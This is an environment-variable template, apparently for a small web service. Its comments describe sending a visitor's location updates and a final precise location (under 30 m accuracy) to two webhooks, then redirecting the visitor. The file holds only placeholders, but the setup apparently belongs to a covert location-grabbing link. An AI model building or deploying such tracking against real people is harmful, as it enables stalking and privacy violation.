# Environment Variables (Copy this to .env and fill in your values)

# Webhook 1: FINAL precise location (accuracy < 30m) sent here
WEBHOOK_URL=https://your-webhook-url-here.com/api/webhook

# Webhook 2: ALL location updates sent here (every update from open till redirect)
WEBHOOK_URL_2=https://your-webhook-url-2-here.com/api/webhook

# Redirect URL - User will be redirected here AFTER accuracy < 30m is achieved
REDIRECT_URL=https://your-redirect-url-here.com

# Port (Railway sets this automatically)
PORT=3000
